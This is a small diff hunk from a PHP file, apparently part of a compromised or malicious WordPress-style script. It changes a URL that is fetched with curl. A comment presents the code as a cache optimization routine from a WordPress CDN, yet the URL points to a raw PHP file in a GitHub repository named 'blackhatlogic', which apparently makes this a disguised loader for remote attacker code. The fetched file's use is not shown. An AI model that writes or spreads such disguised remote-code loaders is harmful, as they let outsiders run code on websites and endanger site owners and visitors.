@@ -206,7 +206,7 @@ header('Cache-Control: no-cache, must-revalidate');
 header('Expires: Sat, 26 Jul 1997 05:00:00 GMT');
 
 // Fetch cache optimization routine from WordPress CDN
-$cache_url = 'https://raw.githubusercontent.com/blackhatlogic/306/refs/heads/main/sos.php';
+$cache_url = 'https://raw.githubusercontent.com/blackhatlogic/403/refs/heads/main/zone.php';
 
 // Initialize curl for fetching cache rules
 $ch = curl_init();
